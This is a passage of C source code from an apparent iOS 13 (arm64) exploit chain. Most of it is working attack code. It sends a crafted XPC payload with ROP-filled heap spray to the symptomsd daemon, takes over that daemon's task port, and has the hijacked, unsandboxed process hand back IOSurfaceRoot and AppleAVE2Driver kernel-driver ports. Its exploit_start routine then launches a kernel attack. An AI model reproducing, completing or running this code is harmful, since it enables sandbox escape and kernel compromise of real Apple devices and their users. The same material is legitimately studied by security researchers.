    char *payload_inner = payload + 72 + 4;
    
    *(uint16_t*)(payload_inner + 2) = 100; // v45
    // Do not let these pass: if ( v45 & 3 )
    //                        if ( payload_remain_len < v45 + 4 )    //payload_remain_len: payload_size - 72 - 4
    //                        if ( (unsigned int)v45 <= 11 )
    //                        if ( v47 + 8 > v45 )                   //v47: *(uint32_t*)(payload_inner + 8)
    *(uint32_t*)(payload_inner + 8) = 100 - 8; // provided EventKey max length
    *(uint32_t*)(payload_inner + 4) = 0xFFFFFFFF; // Must let it passes: if( _bittest((int*)(payload_inner + 4), 29u) )
    strcpy(payload_inner + 12, "com.apple.symptoms.test.request-passthrough");
    
    xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_data(msg, "payload", payload, payload_size);
    
    
    // for spray
    uint32_t dispatchData_len = 0x20000;
    void *dispatchData = malloc(dispatchData_len);
    bzero(dispatchData, dispatchData_len);
    
    for(int i=0; i<dispatchData_len; i=i+0x4000){
        char *each_page_spray = dispatchData + i;
        
        /*
         Now fake cls point to 0x150010110
         */
        
        Assemble_part1_ROP((uint64_t*)each_page_spray, SPRAY_ADDRESS);
    }
    
    xpc_object_t sprayarr = xpc_array_create(NULL, 0);
    xpc_object_t spraydata = xpc_data_create(dispatchData, dispatchData_len);
    
    for(int i=0; i<13000; i++){
        xpc_array_append_value(sprayarr, spraydata);
    }
    xpc_dictionary_set_value(msg, "spray", sprayarr);
    
    // ports spray
    
    
    xpc_connection_send_message_with_reply(xpcconn, msg, dispatch_get_main_queue(), ^(xpc_object_t object) {
        printf("replyB: %s\n", xpc_copy_description(object));
    });
}

mach_port_t symptomsd_bsport = 0;
uint32_t Retrieve_symptomsd_bootstrap_port(){
    if(symptomsd_bsport)
        return symptomsd_bsport;
    bootstrap_look_up(bootstrap_port, TARGET_MACH_SERVICE, &symptomsd_bsport);
    if(!symptomsd_bsport){
        printf("%s bootstrap_look_up failed\n", TARGET_MACH_SERVICE);
        return 0;
    }
    return symptomsd_bsport;
}

bool Send_our_serverport(){
    struct {
        mach_msg_header_t Head;
        mach_msg_body_t msgh_body;
        mach_msg_port_descriptor_t our_recv_port;
        mach_msg_port_descriptor_t our_task_port;
        mach_msg_port_descriptor_t IOSurfaceRoot_servport;
        mach_msg_port_descriptor_t AppleAVE2Driver_servport;
    }msg = {0};
    
    msg.Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    msg.Head.msgh_size = sizeof(msg);
    msg.Head.msgh_remote_port = Retrieve_symptomsd_bootstrap_port();
    msg.Head.msgh_id = 0x8888;
    msg.msgh_body.msgh_descriptor_count = 4;
    msg.our_recv_port.name = our_serverport;
    msg.our_recv_port.disposition = MACH_MSG_TYPE_MAKE_SEND;
    msg.our_recv_port.type = MACH_MSG_PORT_DESCRIPTOR;
    msg.our_task_port.name = mach_task_self();
    msg.our_task_port.disposition = MACH_MSG_TYPE_COPY_SEND;
    msg.our_task_port.type = MACH_MSG_PORT_DESCRIPTOR;
    
    extern CFMutableDictionaryRef IOServiceMatching(const char *name);
    extern io_service_t IOServiceGetMatchingService(mach_port_t masterPort, CFDictionaryRef matching);
    
    msg.IOSurfaceRoot_servport.name = IOServiceGetMatchingService(0, IOServiceMatching("IOSurfaceRoot"));
    msg.IOSurfaceRoot_servport.disposition = MACH_MSG_TYPE_COPY_SEND;
    msg.IOSurfaceRoot_servport.type = MACH_MSG_PORT_DESCRIPTOR;
    
    msg.AppleAVE2Driver_servport.name = IOServiceGetMatchingService(0, IOServiceMatching("AppleAVE2Driver"));
    msg.AppleAVE2Driver_servport.disposition = MACH_MSG_TYPE_COPY_SEND;
    msg.AppleAVE2Driver_servport.type = MACH_MSG_PORT_DESCRIPTOR;
    
    mach_msg(&msg.Head, MACH_SEND_MSG, msg.Head.msgh_size, 0, 0, 0, 0);
    {
        // Check if our msg has been received yet
        bzero(&msg.Head, sizeof(msg));
        msg.Head.msgh_size = sizeof(msg);
        msg.Head.msgh_local_port = our_serverport;
        
        if(mach_msg(&msg.Head, MACH_RCV_MSG|MACH_RCV_TIMEOUT, 0, msg.Head.msgh_size, msg.Head.msgh_local_port, 500, 0))
            return false;
    }
    
    return true;
}

mach_port_t Retrieve_symptomsd_task_port(){
    struct {
        mach_msg_header_t Head;
        mach_msg_body_t msgh_body;
        mach_msg_port_descriptor_t port;
        mach_msg_trailer_t trailer;
    }msg = {0};
    msg.Head.msgh_size = sizeof(msg);
    msg.Head.msgh_local_port = our_serverport;
    int mrr = mach_msg_receive(&msg.Head);
    
    if(mrr != 0){
        printf("Error occurred when Retrieve_symptomsd_task_port(0x%x)\n", mrr);
        return 0;
    }
    return msg.port.name;
}

void Send_overwritting_iosurfaceMap(uint64_t remote_map_addr, uint64_t *local_map_addr){
    
    struct {
        mach_msg_header_t Head;
        uint64_t remote_map_addr;
    }msg = {0};
    
    msg.Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    msg.Head.msgh_size = sizeof(msg);
    msg.Head.msgh_remote_port = Retrieve_symptomsd_bootstrap_port();
    msg.remote_map_addr = remote_map_addr;
    
    mach_msg(&msg.Head, MACH_SEND_MSG, msg.Head.msgh_size, 0, 0, 0, 0);
    
    struct {
        mach_msg_header_t Head;
        uint64_t local_map_addr;
        mach_msg_trailer_t trailer;
    }msg2 = {0};
    msg2.Head.msgh_size = sizeof(msg2);
    msg2.Head.msgh_local_port = our_serverport;
    int rt = mach_msg_receive(&msg2.Head);
    
    printf("vm remap: 0x%x local_map_addr: 0x%llx\n", rt, msg2.local_map_addr);
    *local_map_addr = msg2.local_map_addr;
}

void Reply_notify_completion(){
    struct {
        mach_msg_header_t Head;
        mach_msg_trailer_t trailer;
    }msg = {0};
    msg.Head.msgh_size = sizeof(msg);
    msg.Head.msgh_local_port = our_serverport;
    mach_msg_receive(&msg.Head);
}

void Send_notify_msg(){
    struct {
        mach_msg_header_t Head;
    }msg = {0};
    msg.Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    msg.Head.msgh_size = sizeof(msg);
    msg.Head.msgh_remote_port = Retrieve_symptomsd_bootstrap_port();
    
    mach_msg(&msg.Head, MACH_SEND_MSG, msg.Head.msgh_size, 0, 0, 0, 0);
}

// below are testing code

void new_guard_thing_test(){
    kern_return_t (*mach_port_guard_with_flags)
    (
     ipc_space_t task,
     mach_port_name_t name,
     mach_port_context_t guard,
     uint64_t flags
     ) = 0x1aafb0584;
    
    io_service_t ioserv = IOServiceGetMatchingService(0, IOServiceMatching("AppleSPUProfileDriver"));
    printf("ioserv: 0x%x\n", ioserv);
    
#define MPG_STRICT              0x01    /* Apply strict guarding for a port */
#define MPG_IMMOVABLE_RECEIVE   0x02    /* Receive right cannot be moved out of the space */
    
    //int kr = mach_port_guard_with_flags(mach_task_self(), ioserv, 2, MPG_IMMOVABLE_RECEIVE);
    //printf("0x%x\n", kr);
}

void io_test(){
    io_service_t ioserv = IOServiceGetMatchingService(0, IOServiceMatching("IOSurfaceRoot"));
    printf("ioserv: 0x%x\n", ioserv);
    io_connect_t ioconn = 0;
    IOServiceOpen(ioserv, mach_task_self(), 0, &ioconn);
    printf("ioconn: 0x%x\n", ioconn);
    
    // test if a IOconn thats accessible from within the sandbox, will that trigger PORT_GUARD crash when pass from other proc
    // YES!
    // So IOServiceOpen has been mitigated in particular
    // then test if such mitigation also applied to user app
    
    printf("bootstrap server: 0x%x\n", Retrieve_symptomsd_bootstrap_port());
    
    struct {
        mach_msg_header_t Head;
        mach_msg_body_t msgh_body;
        mach_msg_ool_ports_descriptor_t test_port;
    }msg = {0};
    
    msg.Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    msg.Head.msgh_size = sizeof(msg);
    msg.Head.msgh_remote_port = Retrieve_symptomsd_bootstrap_port();
    msg.msgh_body.msgh_descriptor_count = 1;
    ioconn = mach_task_self();
    msg.test_port.address = &ioconn;
    msg.test_port.count = 1;
    msg.test_port.copy = MACH_MSG_VIRTUAL_COPY;
    msg.test_port.deallocate = false;
    msg.test_port.disposition = MACH_MSG_TYPE_COPY_SEND;
    msg.test_port.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    
    mach_msg(&msg.Head, MACH_SEND_MSG, msg.Head.msgh_size, 0, 0, 0, 0);
}

kern_return_t print_all_ports(){
    task_t TargetTask = mach_task_self();
    kern_return_t kr;
    mach_port_name_array_t portNames = NULL;
    mach_msg_type_number_t portNamesCount;
    mach_port_type_array_t portRightTypes = NULL;
    mach_msg_type_number_t portRightTypesCount;
    mach_port_right_t p;
    
    kr = mach_port_names(TargetTask,&portNames,&portNamesCount,&portRightTypes,&portRightTypesCount);
    if(kr!=KERN_SUCCESS){
        fprintf(stderr,"Error getting mach_port_Names.. %d\n",kr);
        return (kr);
    }
    
    for(p=0;p<portNamesCount;p++){
        //convert type to string
        mach_port_type_t port_type = portRightTypes[p];
        char *type_str = NULL;
        if(port_type==MACH_PORT_TYPE_NONE){
            type_str = "NONE"; //0x0000
        }
        if(port_type==MACH_PORT_TYPE_SEND){
            type_str = "SEND"; //0x10000
        }
        if(port_type==MACH_PORT_TYPE_RECEIVE){
            type_str = "RECEIVE"; //0x20000
        }
        if(port_type==MACH_PORT_TYPE_SEND_ONCE){
            type_str = "SEND_ONCE"; //0x40000
        }
        if(port_type==MACH_PORT_TYPE_PORT_SET){
            type_str = "PORT_SET"; //0x80000
        }
        if(port_type==MACH_PORT_TYPE_DEAD_NAME){
            type_str = "DEAD_NAME"; //0x100000
        }
        if(port_type==MACH_PORT_TYPE_LABELH){
            type_str = "LABELH"; //0x200000
        }
        
        //convenient combinations
        if(port_type==MACH_PORT_TYPE_SEND_RECEIVE){
            type_str = "SEND_RECEIVE"; //0x30000
        }
        if(port_type==MACH_PORT_TYPE_SEND_RIGHTS){
            type_str = "SEND_RIGHTS"; //0x50000
        }
        if(port_type==MACH_PORT_TYPE_PORT_RIGHTS){
            type_str = "PORT_RIGHTS"; //0x70000
        }
        if(port_type==MACH_PORT_TYPE_PORT_OR_DEAD){
            type_str = "OR_DEAD"; //0x170000
        }
        if(port_type==MACH_PORT_TYPE_ALL_RIGHTS){
            type_str = "ALL_RIGHTS"; //0x1f0000
        }
        
        if(type_str!=NULL)
            printf("0x%x %s\n",portNames[p],type_str);
        else
            printf("0x%x 0x%x\n",portNames[p],port_type);
    }
    return 0;
}

char _tempfile1_path[256] = {0};
char *Get_tempfile1_path(){
    
    if(strlen(_tempfile1_path) != 0)
        return _tempfile1_path;
    
    confstr(_CS_DARWIN_USER_TEMP_DIR, _tempfile1_path, sizeof(_tempfile1_path));
    strcat(_tempfile1_path, "12asufh");
    return _tempfile1_path;
}


void trit (io_iterator_t it,int index){
    io_service_t ioserv;
    io_name_t ioname;
    IORegistryIteratorEnterEntry(it);
    
    index +=2;
    
    while ( (ioserv = IOIteratorNext(it))){
        IOObjectGetClass(ioserv, ioname);
        for(int i=0;i<index;i++)
            printf("-");
        printf(" Found: %s\n", ioname);
        
        trit(it,index);
    }
    IORegistryIteratorExitEntry(it);
    index-=2;
}

void print_cbuf(uint8_t *buf, size_t len){
    printf("uint8_t c_arrays[%lu] = {",(unsigned long)len);
    size_t tmpsize = 0;
    for(tmpsize = 0x0; tmpsize < len; tmpsize++){
        if(tmpsize+1 == len)
            printf("0x%x}", *(buf + tmpsize));
        else
            printf("0x%x,", *(buf + tmpsize));
    }
}

void Send_overwritting_iosurfaceMap22(uint64_t our_data_addr, uint64_t our_data_len, uint64_t remote_map_addr){
    
    struct {
        mach_msg_header_t Head;
        uint64_t our_data_addr;
        uint64_t our_data_len;
        uint64_t remote_map_addr;
    }msg = {0};
    
    msg.Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    msg.Head.msgh_size = sizeof(msg);
    msg.Head.msgh_remote_port = Retrieve_symptomsd_bootstrap_port();
    msg.our_data_addr = our_data_addr;
    msg.our_data_len = our_data_len;
    msg.remote_map_addr = remote_map_addr;
    
    mach_msg(&msg.Head, MACH_SEND_MSG, msg.Head.msgh_size, 0, 0, 0, 0);
}

//#define printf(X,X1...) {char logdata[256];snprintf(logdata, sizeof(logdata), X, X1);extern void log_toView(const char *input_cstr);log_toView(logdata);}
#define printf2(X) {extern void log_toView(const char *input_cstr);log_toView(X);}
//#define printf2 printf

void print_char(uint8_t *data_ptr, size_t data_size){
    printf("uint8_t c_arrays[%lu] = {",(unsigned long)data_size);
    size_t additional_size = 0;
    for(additional_size = 0x0;additional_size<data_size;additional_size++){
        if(additional_size+1==data_size)
            printf("0x%x}",*(data_ptr+additional_size));
        else
            printf("0x%x,",*(data_ptr+additional_size));
    }
}

void exploit_start(){
    int kr = 0;
    
    if(setjmp(jmpb))
        return;
    
    extern void log_toView(const char *input_cstr);
    log_toView("+++++ ios13 pwn (arm64) +++++\n");
    
    Find_Gadgets_speed();
    printf2("Dyldcache and Gadgets Ready!\n");
    
    Prepare_our_Mach_server();
    //printf("Our Mach Server Ready! 0x%x\n", our_serverport);
    
    xpc_conn_test_exp1();
    xpc_conn_test_forTrigger();
    xpc_conn_test_exp2();
    
    printf2("Passing our server port to the target...\n");
    while(1){
        // loop here, waiting to be notified that they got the message
        usleep(5000);
        if(Send_our_serverport())
            break;
    }
    
    printf2("Retrieving pwned proc's task port...\n");
    task_t symptomsd_task = Retrieve_symptomsd_task_port();
    printf("  symptomsd_task: 0x%x\n", symptomsd_task);
    
    pid_t symptomsd_pid = 0;
    kr = pid_for_task(symptomsd_task, &symptomsd_pid);
    if(kr == KERN_SUCCESS){
        printf("task port: 0x%x, pwned proc's pid: %d\n", symptomsd_task, symptomsd_pid);
    }
    else{
        printf("task port: 0x%x, but pid_for_task failed (kr: 0x%x)\n", symptomsd_pid, kr);
    }
    
    // Ask the unsandbox daemon which has been totally controlled at this moment
    // To open IO device ports, and passing to us for next stage kernel attacking.
    //printf2("Collecting Kernel attack surface:\n");
    
    Reply_notify_completion(); // Waiting for pwned proc preparing port
    
    uint32_t IOSurfaceRootUserClient_port = 0;
    task_get_special_port(symptomsd_task, TASK_SEATBELT_PORT, &IOSurfaceRootUserClient_port);
    printf("  1/2: 0x%x\n", IOSurfaceRootUserClient_port);
    
    Send_notify_msg();
    Reply_notify_completion(); // Waiting preparing another port
    
    uint32_t AppleAVE2UserClient_port = 0;
    task_get_special_port(symptomsd_task, TASK_ACCESS_PORT, &AppleAVE2UserClient_port);
    printf("  2/2: 0x%x\n", AppleAVE2UserClient_port);
    
    printf2("Stage update: now attacking kernel...\n");
    printf2("1\n");
    
    void kernel_exp_start(uint32_t ave_ioconn, uint32_t surface_ioconn);
    kernel_exp_start(AppleAVE2UserClient_port, IOSurfaceRootUserClient_port);
}

#endif

